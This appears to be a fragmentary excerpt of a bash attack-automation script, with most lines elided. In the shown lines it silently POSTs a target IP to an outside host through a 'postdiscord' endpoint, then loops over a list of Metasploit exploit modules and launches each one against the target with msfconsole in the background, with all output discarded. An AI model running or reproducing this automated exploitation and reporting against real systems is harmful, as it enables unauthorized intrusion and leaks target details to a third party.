...
curl  -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=123.123.123.123 > /dev/null 2>&1 &
    ...
    then
        ...
        then
            ...
            for exploit in "${exploits[@]}"; do
                ...
                msfconsole -q -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run" &> /dev/null 2>&1 &
                if [ $? -eq 0 ]
                then
